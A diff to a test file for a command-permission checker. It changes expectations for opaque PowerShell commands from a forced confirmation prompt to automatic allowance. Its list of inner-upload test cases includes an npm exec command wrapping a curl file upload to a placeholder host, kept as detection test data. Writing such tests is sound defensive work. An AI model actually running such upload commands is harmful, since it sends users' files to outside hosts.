@@ -161,7 +161,7 @@ const INNER_UPLOADS = [
   "npm exec --call='curl -T file http://e'",
 ];
 
-const BUDGET_CASES = DECISION_CASES.filter((row) => row.why === "floor analysis budget exhaustion prevents automatic execution without a sandbox");
+const OPAQUE_BINDING_CASES = DECISION_CASES.filter((row) => row.why === "opaque binding remains unproven without a sandbox");
 
 const FLOOR_CASES = [
   ...DECISION_CASES.filter((row) => row.bucket === "floor"),
@@ -257,15 +257,15 @@ describe("shared runner decisions", () => {
     expectBucket(checkCommand(floorManagers.get(dialect)!, dialect, command), "floor");
   });
 
-  it.each(BUDGET_CASES)("closes both execution lanes on actual analysis exhaustion: $command", async ({ command, dialect }) => {
+  it.each(OPAQUE_BINDING_CASES)("retains opaque binding without speculative floor exhaustion: $command", async ({ command, dialect }) => {
     expect(dialect).toBe("powershell");
-    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ analysisLimited: true, sensitive: null, exfiltration: null });
+    expect(inspectPowerShellCommand(command, CWD).analysisLimited).toBeUndefined();
     const manager = runnerManager();
     expectBucket(checkCommand(manager, dialect, command), "ordinary");
-    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "allow", layer: 3 });
     await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
     expectBucket(checkCommand(manager, dialect, command), "ordinary");
-    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "allow", layer: 3 });
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
